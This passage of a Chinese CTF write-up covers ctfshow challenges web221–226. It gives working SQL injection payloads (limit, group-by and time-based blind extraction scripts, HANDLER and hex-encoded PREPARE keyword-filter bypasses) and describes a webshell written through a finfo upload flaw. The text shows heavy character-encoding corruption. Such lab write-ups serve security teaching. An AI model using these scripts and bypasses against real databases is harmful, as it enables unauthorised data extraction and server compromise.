string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#print(payload)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>             <span class="token keyword">break</span>              <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(res)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#éå†letterä¸­ä¸€ä¸ªå­—ç¬¦å°±åœæ­¢1s      </span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.3</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#æ­£ç¡®åŒ¹é…åˆ°ä¸€ä¸ªå­—ç¬¦å°±åœæ­¢1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web221â€”â€”Limitæ³¨å…¥"><a href="#web221â€”â€”Limitæ³¨å…¥" class="headerlink" title="web221â€”â€”Limitæ³¨å…¥"></a>web221â€”â€”Limitæ³¨å…¥</h1><p><a href="https://www.jianshu.com/p/6c1420a7a7d9" target="_blank" rel="noopener">Mysql æ³¨å…¥ä¹‹ limit æ³¨å…¥</a></p><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user <span class="token function">limit</span> <span class="token punctuation">(</span><span class="token variable">$page</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token variable">$limit</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤</span><span class="token comment" spellcheck="true">//æ‹¿åˆ°æ•°æ®åº“åå­—å°±ç®—ä½ èµ¢</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>æŒ‰ç…§é“¾æ¥çš„åšæ³•ï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„):å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°?page=1&limit=7 procedure analyse(extractvalue(1,concat(666,database(),666)),1)updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹):æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°?page=1&limit=7 procedure analyse(updatexml(1,concat(0x7e,database(),0x7e),1),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web222â€”â€”group-by-æ³¨å…¥"><a href="#web222â€”â€”group-by-æ³¨å…¥" class="headerlink" title="web222â€”â€”group by æ³¨å…¥"></a>web222â€”â€”group by æ³¨å…¥</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://www.secpulse.com/archives/140616.html" target="_blank" rel="noopener">floor()æŠ¥é”™æ³¨å…¥</a></p><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html" target="_blank" rel="noopener">CTF-sql-group byæŠ¥é”™æ³¨å…¥</a></p><p>y4çš„è„šæœ¬</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""Author:Y4tacker"""</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://6119f221-08cd-4363-88d4-1809bd590024.chall.ctf.show/api/"</span>result <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®åº“</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥åˆ—åå­—</span>        <span class="token comment" spellcheck="true"># payload = "select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1"</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®---ä¸èƒ½ä¸€æ¬¡æŸ¥å®Œè¶Šåˆ°åé¢è¶Šä¸å‡†ç¡®</span>        payload <span class="token operator">=</span> <span class="token string">"select flagaabc from ctfshow_flaga"</span>        <span class="token comment" spellcheck="true"># flag{b747hfb7-P8e8-</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'u'</span><span class="token punctuation">:</span> f<span class="token string">"concat((if (ascii(substr(({payload}),{i},1))>{mid}, sleep(0.05), 2)), 1);"</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„ç”¨sleepä»£æ›¿äº†floor</p><h1 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> select <span class="token operator">*</span> from ctfshow_user group by <span class="token variable">$username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//TODO:å¾ˆå®‰å…¨ï¼Œä¸éœ€è¦è¿‡æ»¤</span><span class="token comment" spellcheck="true">//ç”¨æˆ·åä¸èƒ½æ˜¯æ•°å­—</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>åˆ©ç”¨åŸç†</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">?u=if('a'='a',username,'a')?u=if('a'='b',username,'a')<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è„šæœ¬</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">generateNum</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> <span class="token string">'true'</span>    <span class="token keyword">if</span> num <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> res    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">"+true"</span>        <span class="token keyword">return</span> resurl <span class="token operator">=</span> <span class="token string">"http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/"</span>i <span class="token operator">=</span> <span class="token number">0</span>res <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®åº“-ctfshow_flagas</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥å­—æ®µ-flagasabc</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'"</span>        <span class="token comment" spellcheck="true"># æŸ¥flag</span>        payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"u"</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{generateNum(i)},{generateNum(1)}))>{generateNum(mid)},username,'a')"</span>        <span class="token punctuation">}</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(r.json()['data'])</span>        <span class="token keyword">if</span> <span class="token string">"userAUTO"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸»è¦é€šè¿‡ç”Ÿæˆæ•°å­—çš„å‡½æ•°ï¼Œå°±åŸæœ‰çš„è„šæœ¬è¿›è¡Œäº†æ•°å­—ç¼–ç </p><h1 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h1><p><strong>/robots.txtï¼š</strong></p><pre class="line-numbers language-php"><code class="language-php">User<span class="token operator">-</span>agent<span class="token punctuation">:</span> <span class="token operator">*</span>Disallow<span class="token punctuation">:</span> <span class="token operator">/</span>pwdreset<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816173211309.png" alt></p><p>ç™»é™†åæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•ä»»ä½•æ–‡ä»¶éƒ½æ— æ³•ä¸Šä¼ </p><p><a href="https://www.gem-love.com/ctf/2283.html#ä½ æ²¡è§è¿‡çš„æ³¨å…¥" target="_blank" rel="noopener">ä½ æ²¡è§è¿‡çš„æ³¨å…¥</a>ç»è¿‡è¿™ç¯‡æ–‡ç« ä»‹ç»ï¼Œåº”è¯¥æ˜¯éœ€è¦ä¿®æ”¹æ–‡ä»¶çš„commentsæ˜¯æˆ‘ç”¨çš„ç¾¤é‡Œé¢çš„payload.binæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816183907366.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210816184141602.png" alt></p><p>è¿™é‡Œçš„16è¿›åˆ¶ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯åŸæ¥çš„è¯­å¥ä¸­ï¼Œæœ‰ä¸€ä¸ªè§£æcommentçš„ç¯èŠ‚ï¼Œæ­£å¥½åˆ°äº†è¿™ä¸ªç¯èŠ‚ä¹Ÿå°±ä¸­æ‹›äº†ï¼Œæ‹¬å·è¢«é—­åˆï¼Œæœ¨é©¬æˆåŠŸå†™å…¥</p><p>getshellåè¯»å–upload.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Return Code: "</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"æ–‡ä»¶è¿‡å¤§: "</span> <span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">else</span>      <span class="token punctuation">{</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filepath</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$filetype</span><span class="token punctuation">.</span><span class="token string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"root"</span><span class="token punctuation">,</span><span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Could not connect: '</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"Error: "</span> <span class="token punctuation">.</span> <span class="token variable">$sql</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span> <span class="token punctuation">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å°è¯çŒœæƒ³ï¼Œå…¶ä¸­å…³é”®åœ¨filetypeçš„è§£æç¯èŠ‚å¯¼è‡´äº†commenté‡Œé¢çš„å†…å®¹è¢«è¯»å–å¹¶å†™å…¥ï¼Œè¿™åœ¨ç»™å‡ºçš„æ–‡ç« ä¸­ä¹Ÿæœ‰æåˆ°ï¼Œç›¸ä¿¡ä»”ç»†çœ‹çš„äººéƒ½ä¼šå‘ç°ï¼šæ˜¯å› ä¸ºfinfoçš„ç¼˜æ•…</p><h1 id="web225â€”â€”Handlerã€é¢„å¤„ç†"><a href="#web225â€”â€”Handlerã€é¢„å¤„ç†" class="headerlink" title="web225â€”â€”Handlerã€é¢„å¤„ç†"></a>web225â€”â€”<code>Handlerã€é¢„å¤„ç†</code></h1><p><a href="https://blog.csdn.net/solitudi/article/details/107823398?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160652999219721940215459%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160652999219721940215459&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107823398.pc_v2_rank_blog_default&utm_term=%E5%BC%BA%E7%BD%91%E6%9D%AF&spm=1018.2118.3001.4450" target="_blank" rel="noopener">å¿…çœ‹é“¾æ¥</a></p><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//åˆ†é¡µæŸ¥è¯¢</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where username = '{$username}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ–¹æ³•ä¸€â€”â€”Handler</strong></p><p>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®ï¼Œä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚</p><pre class="line-numbers language-mysql"><code class="language-mysql">/api/?username=';show tables;-- -/api/?username=';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;-- -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><p><strong>æ–¹æ³•äºŒâ€”â€”é¢„å¤„ç†</strong></p><p><strong>æ ‡å‡†æ ¼å¼</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE name from '[my sql sequece]';   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQL        è¯­å¥<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>æˆ‘çš„æ ¼å¼</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from concat('selec','t * from ctfshow_flagasa');EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>concat(char(115,101,108,101,99,116)</code>ä¹Ÿå¯ä»¥ä»£æ›¿<code>select</code></p><h1 id="web226â€”â€”é¢„å¤„ç†é…åˆ16è¿›åˆ¶"><a href="#web226â€”â€”é¢„å¤„ç†é…åˆ16è¿›åˆ¶" class="headerlink" title="web226â€”â€”é¢„å¤„ç†é…åˆ16è¿›åˆ¶"></a>web226â€”â€”é¢„å¤„ç†é…åˆ16è¿›åˆ¶</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i'</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.sojson.com/hexadecimal.html" target="_blank" rel="noopener">æ¥ä¸ªåœ¨çº¿è½¬æ¢åœ°å€</a></p><pre class="line-numbers language-mysql"><code class="language-mysql">PREPARE yn8rt from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE yn8rt;DROP PREPARE yn8rt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æ‹¿åˆ°flagï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆ<code>select database()</code>å´å¾—ä¸åˆ°æ•°æ®åº“åå­—</p><h1 id="web227â€”â€”information-schema-routinesæŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°"><a href="#web227â€”â€”information-schema-routinesæŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°" 